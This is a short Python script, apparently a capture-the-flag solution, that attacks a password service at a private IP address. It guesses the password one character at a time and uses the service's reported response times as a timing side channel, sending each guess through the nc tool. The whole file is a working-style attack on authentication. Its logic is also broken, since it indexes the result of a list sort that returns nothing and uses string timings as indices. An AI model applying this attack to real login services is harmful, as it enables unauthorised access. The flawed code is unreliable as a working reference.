import subprocess

prime = 19

ALL_CHARS = ['a',
             'b',
             'c',
             'd',
             'e',
             'f',
             'g',
             'h',
             'i',
             'j',
             'k',
             'l',
             'm',
             'n',
             'o',
             'p',
             'q',
             'r',
             's',
             't',
             'u',
             'v',
             'w',
             'x',
             'y',
             'z',
             '{',
             '}',
             '=',
             '_']

HASH_IDXS = []
for i in range(prime):
    HASH_IDXS.append((7*i+4)%prime)
print(HASH_IDXS)

TRYPWD = []
TRYPWD.extend(["=" for i in range(prime)])
print(TRYPWD)

for i in range(prime):
    TIMES = []
    PWD = TRYPWD.copy()
    for C in ALL_CHARS:
        PWD[HASH_IDXS[i]] = C
        PWDINP = "".join(PWD) + "\n"
        C = subprocess.Popen(["nc","10.21.235.179","5555"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = C.communicate(input = PWDINP.encode())
        RESPONSE = stdout.decode()
        if (i==18 and (RESPONSE.split("\n")[1].strip()) == "Access Granted"):
            break;
        TIMES.append(((RESPONSE.split("\n")[2]).split("=")[1]).strip())
    if (i != 18):
        TRYPWD[HASH_IDXS[i]] = ALL_CHARS[TIMES.sort()[-1]]
    print(TRYPWD)

print("The Password is: ", "".join(TRYPWD))
        

